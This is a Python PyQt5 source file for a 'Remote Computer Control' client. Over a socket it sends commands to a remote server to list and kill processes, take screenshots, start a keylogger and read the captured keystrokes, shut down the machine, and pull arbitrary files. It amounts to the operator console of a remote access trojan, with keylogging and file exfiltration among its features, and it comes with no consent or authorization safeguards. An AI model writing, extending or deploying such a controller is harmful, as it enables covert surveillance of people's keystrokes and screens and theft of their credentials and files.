import socket
import json
import base64
from io import BytesIO
from PIL import Image
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
                             QTableWidget, QTableWidgetItem, QLineEdit, QLabel, QTabWidget, QFileDialog,
                             QMessageBox, QStatusBar, QToolBar, QAction, QScrollArea, QTextEdit)
from PyQt5.QtGui import QPixmap, QIcon
from PyQt5.QtCore import Qt, QTimer
import sys
import os

# Client configuration
HOST = '127.0.0.1'  # Replace with server IP
PORT = 5000
BUFFER_SIZE = 4096

class RemoteControlGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Remote Computer Control")
        self.setGeometry(100, 100, 1200, 800)
        self.sock = None
        self.init_ui()
        self.connect_to_server()

    def init_ui(self):
        """Initialize the GUI."""
        # Main widget and layout
        self.main_widget = QWidget()
        self.setCentralWidget(self.main_widget)
        self.main_layout = QVBoxLayout(self.main_widget)

        self.content_widget = QWidget()
        self.content_layout = QVBoxLayout(self.content_widget)
        self.main_layout.addWidget(self.content_widget)

        # Reinitialize tabs for content
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("QTabWidget::pane { border: 1px solid #34495e; }")
        self.content_layout.addWidget(self.tabs)

        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)

        # Initialize tabs
        self.init_processes_tab()
        self.init_applications_tab()
        self.init_screenshot_tab()
        self.init_keylogger_tab()
        self.init_shutdown_tab()
        self.init_resources_tab()
        self.init_file_transfer_tab()
        self.setStyleSheet("""
    QMainWindow { background: #f5f6fa; }
    QWidget { font-size: 14px; color: #2f3640; }
    QPushButton { background: #4a69bd; color: white; padding: 10px; border-radius: 5px; }
    QPushButton:hover { background: #405de6; }
    QLineEdit { border: 1px solid #dfe4ea; padding: 8px; border-radius: 5px; background: white; }
    QTableWidget { border: 1px solid #dfe4ea; background: white; alternate-background-color: #ecf0f1; }
    QTabWidget::pane { background: white; }
    QLabel { padding: 5px; }
    QTextEdit { border: 1px solid #dfe4ea; background: white; }
    QStatusBar { background: #4a69bd; color: white; }
""")

    def connect_to_server(self):
        """Connect to the server."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((HOST, PORT))
            self.status_bar.showMessage("Connected to server")
        except Exception as e:
            self.status_bar.showMessage(f"Failed to connect: {e}")
            QMessageBox.critical(self, "Connection Error", f"Failed to connect to server: {e}")

    def recv_all(self):
        """Receive all data until complete JSON message."""
        data = b""
        while True:
            part = self.sock.recv(BUFFER_SIZE)
            if not part:
                break
            data += part
            try:
                json.loads(data.decode('utf-8'))
                break
            except json.JSONDecodeError:
                continue
        return data.decode('utf-8')

    def send_command(self, command):
        """Send command to server and receive response."""
        try:
            self.sock.send(json.dumps(command).encode('utf-8'))
            response = self.recv_all()
            if not response:
                raise ValueError("Received empty response from server")
            return json.loads(response)
        except Exception as e:
            return {"error": str(e)}

    def init_processes_tab(self):
        """Initialize Processes tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(2)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name"])
        self.process_table.setSelectionMode(QTableWidget.SingleSelection)
        layout.addWidget(self.process_table)
        
        btn_layout = QHBoxLayout()
        self.process_input = QLineEdit()
        self.process_input.setPlaceholderText("Enter process name or path")
        btn_start = QPushButton("Start Process")
        btn_terminate = QPushButton("Terminate Process")
        btn_refresh = QPushButton("Refresh List")
        
        btn_layout.addWidget(self.process_input)
        btn_layout.addWidget(btn_start)
        btn_layout.addWidget(btn_terminate)
        btn_layout.addWidget(btn_refresh)
        layout.addLayout(btn_layout)
        
        btn_start.clicked.connect(self.start_process)
        btn_terminate.clicked.connect(self.terminate_process)
        btn_refresh.clicked.connect(self.refresh_processes)
        
        self.tabs.addTab(tab, "Processes")
        self.refresh_processes()

    def init_applications_tab(self):
        """Initialize Applications tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.app_table = QTableWidget()
        self.app_table.setColumnCount(2)
        self.app_table.setHorizontalHeaderLabels(["PID", "Name"])
        self.app_table.setSelectionMode(QTableWidget.SingleSelection)
        layout.addWidget(self.app_table)
        
        btn_layout = QHBoxLayout()
        self.app_input = QLineEdit()
        self.app_input.setPlaceholderText("Enter application name or path")
        btn_start = QPushButton("Start Application")
        btn_terminate = QPushButton("Terminate Application")
        btn_refresh = QPushButton("Refresh List")
        
        btn_layout.addWidget(self.app_input)
        btn_layout.addWidget(btn_start)
        btn_layout.addWidget(btn_terminate)
        btn_layout.addWidget(btn_refresh)
        layout.addLayout(btn_layout)
        
        btn_start.clicked.connect(self.start_application)
        btn_terminate.clicked.connect(self.terminate_application)
        btn_refresh.clicked.connect(self.refresh_applications)
        
        self.tabs.addTab(tab, "Applications")
        self.refresh_applications()

    def init_screenshot_tab(self):
        """Initialize Screenshot tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.screenshot_label = QLabel("No screenshot captured")
        self.screenshot_label.setAlignment(Qt.AlignCenter)
        self.screenshot_label.setMinimumHeight(400)
        layout.addWidget(self.screenshot_label)

        
        btn_layout = QHBoxLayout()

        btn_capture = QPushButton("Capture Screenshot")
        btn_save = QPushButton("Save Screenshot")

        btn_capture.clicked.connect(self.capture_screenshot)
        btn_save.clicked.connect(self.save_screenshot)
        btn_layout.addWidget(btn_capture)
        btn_layout.addWidget(btn_save)
        layout.addLayout(btn_layout)
        
        self.tabs.addTab(tab, "Screenshot")

    def init_keylogger_tab(self):
        """Initialize Keylogger tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.keylog_text = QTextEdit("Keylogger not started")
        self.keylog_text.setReadOnly(True)
        self.keylog_text.setMaximumHeight(200)  # Limit height to prevent overflow
        layout.addWidget(self.keylog_text)
        
        btn_layout = QHBoxLayout()
        btn_start = QPushButton("Start Keylogger")
        btn_stop = QPushButton("Stop Keylogger")
        
        btn_start.clicked.connect(self.start_keylogger)
        btn_stop.clicked.connect(self.stop_keylogger)
        btn_layout.addWidget(btn_start)
        btn_layout.addWidget(btn_stop)
        layout.addLayout(btn_layout)
        
        self.tabs.addTab(tab, "Keylogger")

    def init_shutdown_tab(self):
        """Initialize Shutdown tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(20)  # Reduce spacing
        
        shutdown_label = QLabel("Shutdown or Restart the System")
        shutdown_label.setStyleSheet("font-size: 16px; font-weight: bold; color: #2f3640; padding: 10px;")
        layout.addWidget(shutdown_label)
        
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(10)
        btn_shutdown = QPushButton("Shutdown System")
        btn_restart = QPushButton("Restart System")
        btn_shutdown.setStyleSheet("min-width: 150px;")
        btn_restart.setStyleSheet("min-width: 150px;")
        btn_shutdown.clicked.connect(self.shutdown_system)
        btn_restart.clicked.connect(lambda: self.send_command({'action': 'shutdown', 'restart': True}))
        btn_layout.addWidget(btn_shutdown)
        btn_layout.addWidget(btn_restart)
        layout.addLayout(btn_layout)
        
        self.tabs.addTab(tab, "Shutdown")

    def init_resources_tab(self):
        """Initialize System Resources tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(15)  # Reduce spacing
        
        resources_label = QLabel("System Resource Monitor")
        resources_label.setStyleSheet("font-size: 16px; font-weight: bold; color: #2f3640; padding: 10px;")
        layout.addWidget(resources_label)
        
        self.resources_display = QLabel("CPU: N/A%\nMemory: N/A%\nDisk: N/A%")
        self.resources_display.setStyleSheet("font-size: 14px; background: white; padding: 15px; border: 1px solid #dfe4ea; border-radius: 5px;")
        layout.addWidget(self.resources_display)
        
        btn_refresh = QPushButton("Refresh Resources")
        btn_refresh.setStyleSheet("min-width: 150px;")
        btn_refresh.clicked.connect(self.refresh_resources)
        layout.addWidget(btn_refresh, alignment=Qt.AlignCenter)
        
        layout.addStretch()  # Push content up and reduce empty space
        self.tabs.addTab(tab, "System Resources")

    def init_file_transfer_tab(self):
        """Initialize File Transfer tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.file_input = QLineEdit()
        self.file_input.setPlaceholderText("Enter file path to transfer")
        btn_transfer = QPushButton("Transfer File")
        btn_transfer.clicked.connect(self.transfer_file)
        
        layout.addWidget(self.file_input)
        layout.addWidget(btn_transfer)
        
        self.tabs.addTab(tab, "File Transfer")

    def refresh_processes(self):
        """Refresh process list."""
        response = self.send_command({'action': 'list_processes'})
        if 'error' in response:
            self.status_bar.showMessage(f"Error: {response['error']}")
            return
        
        self.process_table.setRowCount(len(response))
        for i, proc in enumerate(response):
            self.process_table.setItem(i, 0, QTableWidgetItem(str(proc['pid'])))
            self.process_table.setItem(i, 1, QTableWidgetItem(proc['name']))
        self.process_table.resizeColumnsToContents()
        self.status_bar.showMessage("Process list refreshed")

    def start_process(self):
        """Start a process."""
        process_name = self.process_input.text()
        if not process_name:
            QMessageBox.warning(self, "Input Error", "Please enter a process name")
            return
        response = self.send_command({'action': 'start_process', 'process_name': process_name})
        self.status_bar.showMessage(response if isinstance(response, str) else response.get('error', 'Process started'))

    def terminate_process(self):
        """Terminate a process."""
        selected = self.process_table.selectedItems()
        if not selected:
            QMessageBox.warning(self, "Selection Error", "Please select a process")
            return
        pid = selected[0].text()
        response = self.send_command({'action': 'terminate_process', 'pid': pid})
        self.status_bar.showMessage(response if isinstance(response, str) else response.get('error', 'Process terminated'))
        self.refresh_processes()

    def refresh_applications(self):
        """Refresh application list."""
        response = self.send_command({'action': 'list_applications'})
        if 'error' in response:
            self.status_bar.showMessage(f"Error: {response['error']}")
            return
        
        self.app_table.setRowCount(len(response))
        for i, app in enumerate(response):
            self.app_table.setItem(i, 0, QTableWidgetItem(str(app['pid'])))
            self.app_table.setItem(i, 1, QTableWidgetItem(app['name']))
        self.app_table.resizeColumnsToContents()
        self.status_bar.showMessage("Application list refreshed")

    def start_application(self):
        """Start an application."""
        app_name = self.app_input.text()
        if not app_name:
            QMessageBox.warning(self, "Input Error", "Please enter an application name")
            return
        response = self.send_command({'action': 'start_application', 'app_name': app_name})
        self.status_bar.showMessage(response if isinstance(response, str) else response.get('error', 'Application started'))

    def terminate_application(self):
        """Terminate an application."""
        selected = self.app_table.selectedItems()
        if not selected:
            QMessageBox.warning(self, "Selection Error", "Please select an application")
            return
        pid = selected[0].text()
        response = self.send_command({'action': 'terminate_application', 'pid': pid})
        self.status_bar.showMessage(response if isinstance(response, str) else response.get('error', 'Application terminated'))
        self.refresh_applications()

    def capture_screenshot(self):
        """Capture and display screenshot."""
        response = self.send_command({'action': 'capture_screenshot'})
        if 'error' in response:
            self.status_bar.showMessage(f"Error: {response['error']}")
            return
        
        try:
            img_data = base64.b64decode(response)
            pixmap = QPixmap()
            pixmap.loadFromData(img_data)
            self.screenshot_label.setPixmap(pixmap.scaled(self.screenshot_label.size(), Qt.KeepAspectRatio))
            self.status_bar.showMessage("Screenshot captured")
        except Exception as e:
            self.status_bar.showMessage(f"Error displaying screenshot: {e}")

    def save_screenshot(self):
        """Save the current screenshot to a file."""
        pixmap = self.screenshot_label.pixmap()
        if pixmap and not pixmap.isNull():
            file_name, _ = QFileDialog.getSaveFileName(self, "Save Screenshot", "", "PNG Files (*.png);;JPEG Files (*.jpg)")
            if file_name:
                pixmap.save(file_name)
                self.status_bar.showMessage(f"Screenshot saved as {file_name}")
        else:
            self.status_bar.showMessage("No screenshot to save")
                

    def start_keylogger(self):
        """Start keylogger."""
        response = self.send_command({'action': 'start_keylogger'})
        self.keylog_text.append(response if isinstance(response, str) else response.get('error', 'Keylogger started'))
        self.status_bar.showMessage("Keylogger started")

    def stop_keylogger(self):
        """Stop keylogger and display logged keys."""
        response = self.send_command({'action': 'stop_keylogger'})
        self.keylog_text.setText(response if isinstance(response, str) else response.get('error', 'No keystrokes captured'))
        self.status_bar.showMessage("Keylogger stopped")

    def shutdown_system(self):
        """Shutdown the system."""
        response = self.send_command({'action': 'shutdown'})
        self.status_bar.showMessage(response if isinstance(response, str) else response.get('error', 'System shutting down'))

    def refresh_resources(self):
        """Refresh system resources."""
        response = self.send_command({'action': 'system_resources'})
        if 'error' in response:
            self.status_bar.showMessage(f"Error: {response['error']}")
            return
        
        text = f"CPU: {response['cpu']}%\nMemory: {response['memory']}%\nDisk: {response['disk']}%"
        self.resources_display.setText(text)
        self.status_bar.showMessage("System resources refreshed")

    def transfer_file(self):
        """Transfer a file from server."""
        file_path = self.file_input.text()
        if not file_path:
            QMessageBox.warning(self, "Input Error", "Please enter a file path")
            return
        response = self.send_command({'action': 'transfer_file', 'file_path': file_path})
        if 'error' in response:
            self.status_bar.showMessage(f"Error: {response['error']}")
            return
        
        try:
            file_name = QFileDialog.getSaveFileName(self, "Save File")[0]
            if file_name:
                file_data = base64.b64decode(response)
                with open(file_name, 'wb') as f:
                    f.write(file_data)
                self.status_bar.showMessage(f"File saved as {file_name}")
        except Exception as e:
            self.status_bar.showMessage(f"Error saving file: {e}")

    def closeEvent(self, event):
        """Handle window close event."""
        if self.sock:
            self.sock.close()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = RemoteControlGUI()
    window.show()
    sys.exit(app.exec_())